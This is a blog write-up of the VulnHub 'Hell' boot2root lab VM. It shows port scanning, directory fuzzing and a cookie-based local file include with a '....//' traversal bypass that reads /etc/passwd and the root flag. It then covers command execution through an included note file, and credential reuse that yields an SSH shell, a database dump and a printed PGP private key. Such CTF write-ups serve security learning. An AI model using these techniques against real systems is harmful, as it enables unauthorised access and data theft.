<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hell would just not freeze over! | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="##foreword
Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="Hell would just not freeze over!">
<meta property="og:description" content="##foreword
Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-07-20T19:00:46+00:00">
<meta property="article:modified_time" content="2014-07-20T19:00:46+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Hell would just not freeze over!">
<meta name=twitter:description content="##foreword
Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"Hell would just not freeze over!","item":"https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hell would just not freeze over!","name":"Hell would just not freeze over!","description":"##foreword Lets start by saying that this is probably one of the toughest boot2root\u0026rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I\u0026rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)\n","keywords":[],"articleBody":"##foreword Lets start by saying that this is probably one of the toughest boot2root’s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I’ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)\nwelcome to hell Hell is another vulnerable VM hosted at @VulnHub. After recently completing the SkyTower Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging… The wife was away on a girls weekend out, so I had plenty of time to sit and really think about things without distractions.\nthe usual first steps So, like most other CTF type VM’s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:\nroot@kali:~# nmap --reason 192.168.56.102 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-20 19:15 SAST Nmap scan report for 192.168.56.102 Host is up, received reset (0.00025s latency). Not shown: 996 filtered ports Reason: 996 no-responses PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 111/tcp open rpcbind syn-ack 666/tcp open doom syn-ack Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first whaaat moment, tcp/666.\npoking around The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:\nroot@kali:~# telnet 192.168.56.102 666 Trying 192.168.56.102... Connected to 192.168.56.102. Escape character is '^]'. Welcome to the Admin Panel Archiving latest version on webserver (echoserver.bak)... Starting echo server and monitoring... ping ping pong pong ^]quit telnet quit Connection closed. The line ‘Archiving latest version on webserver (echoserver.bak)…' hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.\nthe echo server From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to echoserver.bak:\nroot@kali:~# curl \"http://192.168.56.102/echoserver.bak\"  echoserver.bak % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 7846 100 7846 0 0 1290k 0 --:--:-- --:--:-- --:--:-- 1532k root@kali:~# file echoserver.bak echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation \u0026 analysis. To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I’d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a strace, one will notice the server ‘dying’ when a socket is closed:\nbind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr(\"0.0.0.0\")}, 16) = 0 listen(3, 10) = 0 accept(3, 0, NULL) = 4 read(4, \"test\\r\\n\", 2000) = 6 write(4, \"test\\r\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 1500) = 1500 read(4, \"\", 2000) = 0 write(4, \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 1500) = 1500 read(4, \"\", 2000) = 0 write(4, \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"..., 1500) = -1 EPIPE (Broken pipe) --- SIGPIPE (Broken pipe) @ 0 (0) --- +++ killed by SIGPIPE +++ Eventually I decided to leave the echoserver alone and move on to the web server.\nthe web server Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the robots.txt:\nroot@kali:~# curl http://192.168.56.102/robots.txt User-agent: * Disallow: /personal/ Disallow: /super_secret_login_path_muhahaha/ The folder personal/ had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. super_secret_login_path_muhahaha however, presented us with a login portal with a title Admin.\nThe login form posted to login.php, and on failure would 302 to: http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1. Fuzzing the_user_is_a_failure simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.\nThe next move was to fuzz more directories and maybe some interesting files. I decided on wfuzz for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:\nroot@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ ******************************************************** * Wfuzz 2.0 - The Web Bruteforcer * ******************************************************** Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt Total requests: 3036 ================================================================== ID Response Lines Word Chars Request ================================================================== 00013: C=200 7 L 11 W 88 Ch \" - 1\" 02780: C=200 5606 L 35201 W 1028165 Ch \" - server\" Adding .php to the end of my fuzz keyword revealed some more interesting files:\nroot@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php ******************************************************** * Wfuzz 2.0 - The Web Bruteforcer * ******************************************************** Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt Total requests: 3036 ================================================================== ID Response Lines Word Chars Request ================================================================== 01375: C=200 17 L 33 W 371 Ch \" - index\" 01663: C=302 0 L 0 W 0 Ch \" - login\" 01684: C=200 5 L 19 W 163 Ch \" - mail\" 02009: C=302 21 L 38 W 566 Ch \" - panel\" 02076: C=302 17 L 35 W 387 Ch \" - personal\" 02439: C=200 7 L 21 W 170 Ch \" - server\" 02852: C=200 2 L 2 W 19 Ch \" - users\" So this gives us slightly more to work with. All of the above are relative to super_secret_login_path_muhahaha. /1 was a big red INTRUDER ALERT message, and /server was a gif of a server rack falling over.\nFrom the .php file side of things, it was slightly more interesting.\n302 content anyone? I was already aware of index.php as well as login.php due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:\n mail.php was a page showing us that we have received 2 emails, and that the ‘firewall’ is activated. There was also what I think is a spam filtering dog gif ;) panel.php simply redirected you back to index.php. Assuming there is a auth requirement here. personal.php also simply redirected you back to index.php. Again, assuming a auth requirement. server.php had the gif we saw in /server with some humorous test with it. Nothing really of interest. users.php just returned the words Jack. This is the same user mentioned in the shrine page from /personal/.  Due to these auth requirements, I decided to take all of these url’s to curl, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:\nroot@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies  =\"login\" method=\"post\" action=\"login.php\"   Admin   Username: =\"username\" id=\"username\" type=\"text\" value=\"\"/   Password: =\"password\" id=\"password\" type=\"password\" value=\"\"/   =\"mysubmit\" id=\"mysubmit\" type=\"submit\" value=\"Login\"/   Here I am telling curl to make a GET request to http://192.168.56.102/super_secret_login_path_muhahaha/index.php, using a cookies file called cookies when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of 302’s, and be verbose with output so that I can see the headers. Requesting index.php resulted in a cookie jar of:\nroot@kali:~# cat cookies # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by libcurl! Edit at your own risk. 192.168.56.102 FALSE / FALSE 0 PHPSESSID 8u300rbb0747fi6iocm0lt4310 Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to personal.php:\nroot@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies * About to connect() to 192.168.56.102 port 80 (#0) * Trying 192.168.56.102... * connected * Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)  GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1  User-Agent: curl/7.26.0  Host: 192.168.56.102  Accept: */*  Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310  * HTTP 1.1 or later with persistent connection, pipelining supported 302 Found 20 Jul 2014 07:48:17 GMT (Debian) 19 Nov 1981 08:52:00 GMT =0, pre-check=0 387 # WAIT A SEC... * Connection #0 to host 192.168.56.102 left intact * Issue another request to this URL: 'http://192.168.56.102/super_secret_login_path_muhahaha/index.php' * Re-using existing connection! (#0) with host (nil) * Connected to (nil) (192.168.56.102) port 80 (#0)  GET /super_secret_login_path_muhahaha/index.php HTTP/1.1 Look at line 25. Ignoring the request-body. But we got a 302? Ok lets make another request without the -L flag and check if it reveals anything:\nroot@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies * About to connect() to 192.168.56.102 port 80 (#0) * Trying 192.168.56.102... * connected * Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)  GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1  User-Agent: curl/7.26.0  Host: 192.168.56.102  Accept: */*  Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310  * HTTP 1.1 or later with persistent connection, pipelining supported 302 Found 20 Jul 2014 07:54:07 GMT (Debian) 19 Nov 1981 08:52:00 GMT =0, pre-check=0 387 =\"login\" method=\"post\" action=\"check.php\"   Personal Folder Login   Username: =\"username\" id=\"username\" type=\"text\" value=\"\"/   Password: =\"password\" id=\"password\" type=\"password\" value=\"\"/   =\"mysubmit\" id=\"mysubmit\" type=\"submit\" value=\"Login\"/   * Connection #0 to host 192.168.56.102 left intact * Closing connection #0 Well what do you know. We get a 302 and content. This time we have a login form that posts to check.php. A GET request to check.php resulted in a 302, but to personal.php and not index.php.\npanel.php had similar behavior. Showing content even though we got a 302. The output for panel.php:\nHTML CENTRE H2 Folders H2 TABLE style=\"width:700px\" align=\"center\" TR TDA HREF=\"server.php\"IMG SRC='folder.png'ATD TDA HREF=\"mail.php\"IMG SRC='folder.png'ATD TDA HREF=\"users.php\"IMG SRC='folder.png'ATD TDA HREF=\"personal.php\"IMG SRC='folder.png'ATD TDA HREF=\"notes.php\"IMG SRC='folder.png'ATD TR TR TDH4Server StatusH4TD TDH4Mail StatusH4TD TDH4Auth UsersH4TD TDH4Personal FolderH4TD TDH4NotesH4TD TR CENTRE HTML Here we have another script, notes.php revealed. Browsing to notes.php, we are presented with a input field with a Write Note button, and a message stating: “note.txt stored to temporary storage upon submission”. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.\nfinding the web vuln Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.\nBack to check.php, it was time to check for any potential SQL injection on the post to check.php from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie failcount. failcount would increment with every incorrect login to check.php. After 3 failed attempts, another cookie called intruder was set:\nAdded cookie intruder=\"1\" for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0  Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310 Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for panel.php:\n   Folders  =\"width:700px\" align=\"center\"  =\"server.php\"='folder.png' =\"mail.php\"='folder.png' =\"users.php\"='folder.png' =\"personal.php\"='folder.png' =\"notes.php\"='folder.png'   Server Status Mail Status Auth Users Personal Folder Notes     = \"RED\" INTRUDER ALERT!     Notice the familiar INTRUDER ALERT message? :) Also remember how this file was called /1 from the previous enumeration? Yep! File Include time! With us having a cookiejar file called cookies available for editing, it was easy to play around with this. The normal cookiejar had:\nroot@kali:~# cat cookies # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by libcurl! Edit at your own risk. 192.168.56.102 FALSE / FALSE 0 PHPSESSID 8u300rbb0747fi6iocm0lt4310 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 failcount 4 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 intruder 1 To test the file include, the first knee jerk reaction was to replace the 1 with /etc/passwd. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as /1, like mail.php:\nroot@kali:~# cat cookies # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by libcurl! Edit at your own risk. 192.168.56.102 FALSE / FALSE 0 PHPSESSID 8u300rbb0747fi6iocm0lt4310 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 failcount 4 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 intruder ./mail.php root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies    Folders  =\"width:700px\" align=\"center\"  =\"server.php\"='folder.png' =\"mail.php\"='folder.png' =\"users.php\"='folder.png' =\"personal.php\"='folder.png' =\"notes.php\"='folder.png'   Server Status Mail Status Auth Users Personal Folder Notes     Email's recieved in the last 24 hours: 2  Current Status: Firewall Activated  =\"http://i.imgur.com/JjipeOj.gif\"   YES. It does work! We have the same output added to the panel.php output as we would have if we browsed directly to mail.php. By now the assumption was that the code had something like:\nif ($_COOKIE['intruder']) { include($_COOKIE['intruder']); } …with some kind of filtering preventing reading the /etc/passwd. While I was still pretty excited about finding this vuln, I soon came across this article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the intruder cookie to ....//....//....//....//....//etc/passwd and viola! :)\nroot@kali:~# cat cookies # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by libcurl! Edit at your own risk. 192.168.56.102 FALSE / FALSE 0 PHPSESSID 8u300rbb0747fi6iocm0lt4310 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 failcount 4 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 intruder ....//....//....//....//....//etc/passwd root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies    Folders  =\"width:700px\" align=\"center\"  =\"server.php\"='folder.png' =\"mail.php\"='folder.png' =\"users.php\"='folder.png' =\"personal.php\"='folder.png' =\"notes.php\"='folder.png'   Server Status Mail Status Auth Users Personal Folder Notes   root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/bin/sh bin❌2:2:bin:/bin:/bin/sh sys❌3:3:sys:/dev:/bin/sh sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/bin/sh man❌6:12:man:/var/cache/man:/bin/sh lp❌7:7:lp:/var/spool/lpd:/bin/sh mail❌8:8:mail:/var/mail:/bin/sh news❌9:9:news:/var/spool/news:/bin/sh uucp❌10:10:uucp:/var/spool/uucp:/bin/sh proxy❌13:13:proxy:/bin:/bin/sh www-data❌33:33:www-data:/var/www:/bin/sh backup❌34:34:backup:/var/backups:/bin/sh list❌38:38:Mailing List Manager:/var/list:/bin/sh irc❌39:39:ircd:/var/run/ircd:/bin/sh gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody❌65534:65534:nobody:/nonexistent:/bin/sh libuuid❌100:101::/var/lib/libuuid:/bin/sh Debian-exim❌101:104::/var/spool/exim4:/bin/false statd❌102:65534::/var/lib/nfs:/bin/false sshd❌103:65534::/var/run/sshd:/usr/sbin/nologin postgres❌104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash george❌1000:1000:george,,,:/home/george:/bin/bash mysql❌105:109:MySQL Server,,,:/nonexistent:/bin/false jack❌1001:1001::/home/jack:/bin/sh milk_4_life❌1002:1002::/home/milk_4_life:/bin/sh developers❌1003:1003::/home/developers:/bin/sh bazza❌1004:1004::/home/bazza:/bin/sh oj❌1005:1005::/home/oj:/bin/sh  root@kali:~# YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include /root/flag.txt:\nroot@kali:~# cat cookies # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by libcurl! Edit at your own risk. 192.168.56.102 FALSE / FALSE 0 PHPSESSID 8u300rbb0747fi6iocm0lt4310 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 failcount 4 192.168.56.102 FALSE /super_secret_login_path_muhahaha/ FALSE 0 intruder ....//....//....//....//....//root/flag.txt root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies    Folders  =\"width:700px\" align=\"center\"  =\"server.php\"='folder.png' =\"mail.php\"='folder.png' =\"users.php\"='folder.png' =\"personal.php\"='folder.png' =\"notes.php\"='folder.png'   Server Status Mail Status Auth Users Personal Folder Notes   Congratulations of beating Hell. I hope you enjoyed it and there weren't to many trolls in here for you. Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de  root@kali:~# And bingo. Technically we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don’t know. From here on onwards, the goal was no longer to read /root/flag.txt. No, we now have to root this VM :)\ngaining shell With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the notes.php file, I decided to try include /tmp/note.txt. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to notes.php, entered: , and submitted the form. Next I edited the cookiejar to include /tmp/notes.txt, and proceeded to test my command execution:\nroot@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies [snip]  uid=33(www-data) gid=33(www-data) groups=33(www-data)  root@kali:~# Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:\ncurl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c \"import urllib, sys; print urllib.quote(''.join(sys.stdin));\") -c cookies -b cookies becoming jack With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the www-data user has access to, which is generally quite a lot.\nI looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in login.php:\n// mysql_connect(\"127.0.0.1\", \"Jack\", \"zgcR6mU6pX\") or die (\"Server Error\"); I'll change this back once development is done. Got sick of typing my password. mysql_connect(\"127.0.0.1\", \"www-data\", \"website\") or die(\"Server Error\"); The comment was quite helpful along with all the mentions of Jack on the website, along with the /etc/passwd revealing a jack user, I tried these credentials on a SSH session:\nroot@kali:~# ssh jack@192.168.56.102 jack@192.168.56.102's password: Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. No mail. Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1 $ id uid=1001(jack) gid=1001(jack) groups=1001(jack) $ Well that was easy… With this shell, I also checked out the MySQL database to see if there is any interesting information:\n$ mysql -uwww-data -pwebsite Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 10320 Server version: 5.5.37-0+wheezy1 (Debian) Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql show databases; +--------------------+ | Database | +--------------------+ | information_schema | | website | +--------------------+ 2 rows in set (0.00 sec) mysql use website; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql show tables; +-------------------+ | Tables_in_website | +-------------------+ | users | +-------------------+ 1 row in set (0.00 sec) mysql select * from users; +----------+-----------+ | username | password | +----------+-----------+ | Jack | g0tmi1k69 | +----------+-----------+ 1 row in set (0.00 sec) mysql Alrighty. I made a note about the credentials we have associated with ‘Jack’ so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P\nbecoming milk_4_life Jack had a .pgp folder with a private key stored in hes home directory.\n$ pwd /home/jack/.pgp $ ls -lah total 20K drwx------ 2 jack jack 4.0K Jun 18 12:35 . drwx------ 4 jack jack 4.0K Jun 22 18:28 .. -rwx------ 1 jack jack 39 Jun 18 12:35 note -rwx------ 1 jack jack 1.8K Jun 18 12:20 pgp.priv -rwx------ 1 jack jack 890 Jun 18 12:24 pgp.pub $ cat pgp.priv -----BEGIN PGP PRIVATE KEY BLOCK----- Version: BCPG C# v1.6.1.0 lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil 54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz 7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45 OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j 7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo tqg= =SCkw -----END PGP PRIVATE KEY BLOCK----- $ There was also a note in the directory:\n$ cat note The usual password as with everything. With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that /var/mail was world readable:\n$ pwd /var/mail/jack/received $ ls -lah total 12K drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 . drwxr-sr-x 3 jack jack 4.0K Jul 5 19:56 